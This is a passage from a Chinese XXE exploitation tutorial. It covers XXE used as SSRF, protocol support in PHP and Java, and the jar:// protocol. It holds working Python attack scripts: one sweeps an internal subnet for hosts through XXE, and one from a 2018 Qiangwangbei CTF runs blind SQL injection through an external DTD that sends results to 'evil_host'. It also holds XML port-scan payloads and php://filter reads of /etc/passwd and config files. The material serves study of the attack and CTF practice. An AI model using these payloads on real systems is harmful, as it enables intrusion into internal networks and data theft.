id="我们刚刚都只是做了一件事，那就是通过-file-协议读取本地文件，或者是通过-http-协议发出请求，熟悉-SSRF-的童鞋应该很快反应过来，这其实非常类似于-SSRF-，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如-192-168-0-10-8080）是不是也能实现-SSRF-同样的效果呢？没错，XXE-其实也是一种-SSRF-的攻击手法，因为-SSRF-其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。"><a href="#我们刚刚都只是做了一件事，那就是通过-file-协议读取本地文件，或者是通过-http-协议发出请求，熟悉-SSRF-的童鞋应该很快反应过来，这其实非常类似于-SSRF-，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如-192-168-0-10-8080）是不是也能实现-SSRF-同样的效果呢？没错，XXE-其实也是一种-SSRF-的攻击手法，因为-SSRF-其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。" class="headerlink" title="我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。"></a>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</h5><h4 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a>新的利用：</h4><h5 id="所以要想更进一步的利用我们不能将眼光局限于-file-协议，我们必须清楚地知道在何种平台，我们能用何种协议。"><a href="#所以要想更进一步的利用我们不能将眼光局限于-file-协议，我们必须清楚地知道在何种平台，我们能用何种协议。" class="headerlink" title="所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议。"></a>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议。</h5><h4 id="如图所示："><a href="#如图所示：" class="headerlink" title="如图所示："></a>如图所示：</h4><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt></p>
<h5 id="PHP在安装扩展以后还能支持的协议："><a href="#PHP在安装扩展以后还能支持的协议：" class="headerlink" title="PHP在安装扩展以后还能支持的协议："></a>PHP在安装扩展以后还能支持的协议：</h5><h5 id="如图所示：-1"><a href="#如图所示：-1" class="headerlink" title="如图所示："></a>如图所示：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png" alt></p>
<h4 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h4><h5 id="1-其中从2012年9月开始，Oracle-JDK版本中删除了对gopher方案的支持，后来又支持的版本是-Oracle-JDK-1-7"><a href="#1-其中从2012年9月开始，Oracle-JDK版本中删除了对gopher方案的支持，后来又支持的版本是-Oracle-JDK-1-7" class="headerlink" title="1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7"></a>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7</h5><h5 id="update-7-和-Oracle-JDK-1-6-update-35"><a href="#update-7-和-Oracle-JDK-1-6-update-35" class="headerlink" title="update 7 和 Oracle JDK 1.6 update 35"></a>update 7 和 Oracle JDK 1.6 update 35</h5><h5 id="2-libxml-是-PHP-的-xml-支持"><a href="#2-libxml-是-PHP-的-xml-支持" class="headerlink" title="2.libxml 是 PHP 的 xml 支持"></a>2.libxml 是 PHP 的 xml 支持</h5><h4 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a>实验三：HTTP 内网主机探测</h4><h5 id="我们以存在-XXE-漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用-file-协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux-为例），我们可以尝试读取-etc-network-interfaces-或者-proc-net-arp-或者-etc-host-文件以后我们就有了大致的探测方向了"><a href="#我们以存在-XXE-漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用-file-协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux-为例），我们可以尝试读取-etc-network-interfaces-或者-proc-net-arp-或者-etc-host-文件以后我们就有了大致的探测方向了" class="headerlink" title="我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了"></a>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</h5><h5 id="下面是一个探测脚本的实例："><a href="#下面是一个探测脚本的实例：" class="headerlink" title="下面是一个探测脚本的实例："></a>下面是一个探测脚本的实例：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span><span class="params">(string)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!ENTITY xxe SYSTEM """</span> + <span class="string">'"'</span> + string + <span class="string">'"'</span> + <span class="string">"""&gt;]&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;xml&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;/xml&gt;"""</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span><span class="params">(xml)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">'http://34.200.157.128/CUSTOM/NEW_XEE.php'</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">' '</span>)[<span class="number">-2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="keyword">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">'10.0.0.'</span> + i</span><br><span class="line">        string = <span class="string">'php://filter/convert.base64-encode/resource=http://'</span> + ip + <span class="string">'/'</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h5 id="返回的结果"><a href="#返回的结果" class="headerlink" title="返回的结果"></a>返回的结果</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png" alt></p>
<h4 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a>实验四：HTTP 内网主机端口扫描</h4><h5 id="找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip-地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合-burpsuite-进行端口探测"><a href="#找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip-地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合-burpsuite-进行端口探测" class="headerlink" title="找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测"></a>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</h5><h5 id="比如我们传入："><a href="#比如我们传入：" class="headerlink" title="比如我们传入："></a>比如我们传入：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT data (#PCDATA)&gt;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="返回结果："><a href="#返回结果：" class="headerlink" title="返回结果："></a>返回结果：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████: Connection refused</span><br></pre></td></tr></table></figure>

<h5 id="这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为-参数-然后利用-bp-的-intruder-来帮我们探测"><a href="#这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为-参数-然后利用-bp-的-intruder-来帮我们探测" class="headerlink" title="这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测"></a>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</h5><h5 id="如下图所示："><a href="#如下图所示：" class="headerlink" title="如下图所示："></a>如下图所示：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png" alt></p>
<h5 id="至此，我们已经有能力对整个网段进行了一个全面的探测-并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用-XXE-打击内网服务器甚至能直接-getshell（比如有些-内网的未授权-redis-或者有些通过-http-get-请求就能直接getshell-的-比如-strus2）"><a href="#至此，我们已经有能力对整个网段进行了一个全面的探测-并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用-XXE-打击内网服务器甚至能直接-getshell（比如有些-内网的未授权-redis-或者有些通过-http-get-请求就能直接getshell-的-比如-strus2）" class="headerlink" title="至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）"></a>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</h5><h4 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a>实验五：内网盲注(CTF)</h4><h5 id="2018-强网杯-有一道题就是利用-XXE-漏洞进行内网的-SQL-盲注的-大致的思路如下："><a href="#2018-强网杯-有一道题就是利用-XXE-漏洞进行内网的-SQL-盲注的-大致的思路如下：" class="headerlink" title="2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下："></a>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</h5><h5 id="首先在外网的一台ip地址为-39-107-33-75-33899-的评论框处测试发现-XXE-漏洞，我们输入-xml-以及-dtd-会出现报错"><a href="#首先在外网的一台ip地址为-39-107-33-75-33899-的评论框处测试发现-XXE-漏洞，我们输入-xml-以及-dtd-会出现报错" class="headerlink" title="首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错"></a>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</h5><h4 id="如图所示：-2"><a href="#如图所示：-2" class="headerlink" title="如图所示："></a>如图所示：</h4><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png" alt></p>
<h5 id="既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件-这个点是-Blind-XXE-，必须使用参数实体，外部引用-DTD"><a href="#既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件-这个点是-Blind-XXE-，必须使用参数实体，外部引用-DTD" class="headerlink" title="既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )"></a>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/52dandan.cc/public_html/config.php</span><br></pre></td></tr></table></figure>

<h5 id="拿到第一部分-flag"><a href="#拿到第一部分-flag" class="headerlink" title="拿到第一部分 flag"></a>拿到第一部分 flag</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(BASEDIR, <span class="string">"/var/www/52dandan.club/"</span>);</span><br><span class="line">define(FLAG_SIG, <span class="number">1</span>);</span><br><span class="line">define(SECRETFILE,<span class="string">'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431'</span>);</span><br><span class="line">....</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line"></span><br><span class="line">这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php</span><br><span class="line">过滤器的一个压缩的方法</span><br><span class="line"></span><br><span class="line">压缩：echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);</span><br><span class="line">解压：echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;);</span><br></pre></td></tr></table></figure>

<h5 id="然后我们考虑内网有没有东西，我们读取"><a href="#然后我们考虑内网有没有东西，我们读取" class="headerlink" title="然后我们考虑内网有没有东西，我们读取"></a>然后我们考虑内网有没有东西，我们读取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br><span class="line">/etc/host</span><br></pre></td></tr></table></figure>

<h5 id="找到内网的另一台服务器的-ip-地址-192-168-223-18"><a href="#找到内网的另一台服务器的-ip-地址-192-168-223-18" class="headerlink" title="找到内网的另一台服务器的 ip 地址 192.168.223.18"></a>找到内网的另一台服务器的 ip 地址 192.168.223.18</h5><h5 id="拿到这个-ip-我们考虑就要使用-XXE-进行端口扫描了，然后我们发现开放了-80-端口，然后我们再进行目录扫描，找到一个-test-php-，根据提示，这个页面的-shop-参数存在一个注入-但是因为本身这个就是一个-Blind-XXE-我们的对服务器的请求都是在我们的远程-DTD-中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的-DTD-文件，于是我们的脚本就要挂在我们的-VPS-上，一边边修改-DTD-一边向存在-XXE-漏洞的主机发送请求，脚本就像下面这个样子"><a href="#拿到这个-ip-我们考虑就要使用-XXE-进行端口扫描了，然后我们发现开放了-80-端口，然后我们再进行目录扫描，找到一个-test-php-，根据提示，这个页面的-shop-参数存在一个注入-但是因为本身这个就是一个-Blind-XXE-我们的对服务器的请求都是在我们的远程-DTD-中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的-DTD-文件，于是我们的脚本就要挂在我们的-VPS-上，一边边修改-DTD-一边向存在-XXE-漏洞的主机发送请求，脚本就像下面这个样子" class="headerlink" title="拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子"></a>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</h5><h5 id="示例代码：-7"><a href="#示例代码：-7" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://39.107.33.75:33899/common.php'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">"name"</span>:<span class="string">"evil_man"</span>,</span><br><span class="line">        <span class="string">"email"</span>:<span class="string">"testabcdefg@gmail.com"</span>,</span><br><span class="line">        <span class="string">"comment"</span>:<span class="string">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">                &lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">                %dtd;]&gt;</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">28</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">                f = open(<span class="string">'./evil.dtd'</span>,<span class="string">'w'</span>)</span><br><span class="line">            payload2 = <span class="string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('&#123;&#125;'))then(0)else(1)end)-'1"&gt;</span></span><br><span class="line"><span class="string">                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'&gt;"&gt;</span></span><br><span class="line"><span class="string">                %all;</span></span><br><span class="line"><span class="string">                %send;"""</span>.format(<span class="string">'_'</span>*i+chr(j)+<span class="string">'_'</span>*(<span class="number">27</span>-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'test &#123;&#125;'</span>.format(chr(j))</span><br><span class="line">                r = s.post(url,data=data)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Oti3a3LeLPdkPkqKF84xs="</span> <span class="keyword">in</span> r.content <span class="keyword">and</span> chr(j)!=<span class="string">'_'</span>:</span><br><span class="line">                        result += chr(j)</span><br><span class="line">                        <span class="keyword">print</span> chr(j)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>

<h5 id="这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解"><a href="#这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解" class="headerlink" title="这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解"></a>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</h5><h4 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a>实验六：文件上传</h4><h5 id="我们之前说的好像都是-php-相关，但是实际上现实中很多都是-java-的框架出现的-XXE-漏洞，通过阅读文档，我发现-Java-中有一个比较神奇的协议-jar-，-php-中的-phar-似乎就是为了实现-jar-的类似的功能设计出来的。"><a href="#我们之前说的好像都是-php-相关，但是实际上现实中很多都是-java-的框架出现的-XXE-漏洞，通过阅读文档，我发现-Java-中有一个比较神奇的协议-jar-，-php-中的-phar-似乎就是为了实现-jar-的类似的功能设计出来的。" class="headerlink" title="我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。"></a>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</h5><h5 id="jar-协议的格式："><a href="#jar-协议的格式：" class="headerlink" title="jar:// 协议的格式："></a>jar:// 协议的格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure>

<h5 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:http://host/application.jar!/file/within/the/zip</span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure>

<h5 id="jar-能从远程获取-jar-文件，然后将其中的内容进行解压，等等，这个功能似乎比-phar-强大啊，phar-是没法远程加载文件的（因此-phar-一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的-blackhat-讲述的-phar-的反序列化很有趣，Orange-曾在2017年的-hitcon-中出过这道题）"><a href="#jar-能从远程获取-jar-文件，然后将其中的内容进行解压，等等，这个功能似乎比-phar-强大啊，phar-是没法远程加载文件的（因此-phar-一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的-blackhat-讲述的-phar-的反序列化很有趣，Orange-曾在2017年的-hitcon-中出过这道题）" class="headerlink" title="jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）"></a>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</h5><h4 id="jar-协议处理文件的过程："><a href="#jar-协议处理文件的过程：" class="headerlink" title="jar 协议处理文件的过程："></a>jar 协议处理文件的过程：</h4><h5 id="1-下载-jar-zip-文件到临时文件中"><a href="#1-下载-jar-zip-文件到临时文件中" class="headerlink" title="(1) 下载 jar/zip 文件到临时文件中"></a>(1) 下载 jar/zip 文件到临时文件中</h5><h5 id="2-提取出我们指定的文件"><a href="#2-提取出我们指定的文件" class="headerlink" title="(2) 提取出我们指定的文件"></a>(2) 提取出我们指定的文件</h5><h5 id="3-删除临时文件"><a href="#3-删除临时文件" class="headerlink" title="(3) 删除临时文件"></a>(3) 删除临时文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">那么我们怎么找到我们下载的临时文件呢？</span><br><span class="line"></span><br><span class="line">因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</span><br></pre></td></tr></table></figure>

